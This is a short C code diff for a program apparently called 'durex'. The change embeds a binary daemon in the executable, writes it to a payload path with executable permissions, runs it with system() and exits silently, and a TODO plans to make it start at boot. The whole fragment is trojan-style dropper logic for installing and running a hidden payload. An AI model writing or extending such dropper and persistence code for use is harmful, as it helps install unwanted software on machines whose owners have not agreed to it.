@@ -1,5 +1,8 @@
 #include "durex.h"
 
+extern unsigned char durex_deamon[];
+extern unsigned int durex_deamon_len;
+
 int	main(void)
 {
 	int	fd;
@@ -13,7 +16,7 @@ int	main(void)
 	fd = open(PAYLOAD_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755);
 	if (fd < 0)
 		return EXIT_SUCCESS;
-	write(fd, PAYLOAD_CODE, PAYLOAD_SIZE);
+	write(fd, durex_deamon, durex_deamon_len);
 	system(PAYLOAD_PATH);
 	// TODO: Make if launched at boot.
 	return EXIT_SUCCESS;
